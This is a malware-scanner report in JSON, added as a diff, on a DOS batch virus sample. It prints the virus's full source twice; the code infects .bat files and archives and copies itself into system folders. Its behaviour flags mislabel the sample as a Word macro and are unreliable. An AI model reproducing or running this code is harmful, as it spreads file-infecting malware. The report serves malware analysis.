@@ -1,0 +1,69 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "AUTOEXEC": "Runs when the Word document is opened",
+            "Call": "May call a DLL using Excel 4 Macros",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "\n@Ctty Nul %Hz%\nIf $%1 == $Hzi Goto Hzi\nIf $%1 == $HzZ Goto HzZ\nIf $%1 == $HzA Goto HzA\nIf $%1 == $HzR Goto HzR\nFind \"Hz\"<%0>CoolHz.Bat\nFor %%t in (*.bat) do Call %0 Hzi %%t\nFor %%t in (*.zip) do Call %0 HzZ %%t\nFor %%t in (*.arj) do Call %0 HzA %%t\nFor %%t in (*.rar) do Call %0 HzR %%t\nCopy CoolHz.Bat ..\nCopy CoolHz.Bat C:\\\nCopy CoolHz.Bat C:\\Windows\nCopy CoolHz.Bat C:\\Dos\nDel CoolHz.Bat\nGoto HzQ\n:Hzi\nFind \"Hz\"<%2\nIf %2 == AUTOEXEC.BAT Goto HzN\nIf Not ErrorLevel 1 Goto HzN\nType CoolHz.Bat>>%2\nGoto HzN\n:HzZ\nPkzip %2 CoolHz.Bat\nGoto HzN\n:HzR\nRar a -std %2 CoolHz.Bat\nGoto HzN\n:HzA\nArj a %2 CoolHz.Bat\nGoto HzN\n:HzQ\nCtty Con %Hz%\n:HzN BaTtler IV by Deviator/HAZARD."
+    },
+    "filename": "VirusShare_ecf99376a1b15e363f1711eb62481924",
+    "filesize": 705,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "ecf99376a1b15e363f1711eb62481924",
+        "sha1": "f710bb24a38158bea56b8b2269202d2c41078ca9",
+        "sha256": "a9b9137ca1b3f899e5221096b5b2e70c611bf74a83a098e82443f79c496f9484"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@Ctty Nul %Hz%",
+            "If $%1 == $Hzi Goto Hzi",
+            "If $%1 == $HzZ Goto HzZ",
+            "If $%1 == $HzA Goto HzA",
+            "If $%1 == $HzR Goto HzR",
+            "Find \"Hz\"<%0>CoolHz.Bat",
+            "For %%t in (*.bat) do Call %0 Hzi %%t",
+            "For %%t in (*.zip) do Call %0 HzZ %%t",
+            "For %%t in (*.arj) do Call %0 HzA %%t",
+            "For %%t in (*.rar) do Call %0 HzR %%t",
+            "Copy CoolHz.Bat ..",
+            "Copy CoolHz.Bat C:\\",
+            "Copy CoolHz.Bat C:\\Windows",
+            "Copy CoolHz.Bat C:\\Dos",
+            "Del CoolHz.Bat",
+            "Goto HzQ",
+            ":Hzi",
+            "Find \"Hz\"<%2",
+            "If %2 == AUTOEXEC.BAT Goto HzN",
+            "If Not ErrorLevel 1 Goto HzN",
+            "Type CoolHz.Bat>>%2",
+            "Goto HzN",
+            ":HzZ",
+            "Pkzip %2 CoolHz.Bat",
+            "Goto HzN",
+            ":HzR",
+            "Rar a -std %2 CoolHz.Bat",
+            "Goto HzN",
+            ":HzA",
+            "Arj a %2 CoolHz.Bat",
+            "Goto HzN",
+            ":HzQ",
+            "Ctty Con %Hz%",
+            ":HzN BaTtler IV by Deviator/HAZARD."
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.264016",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
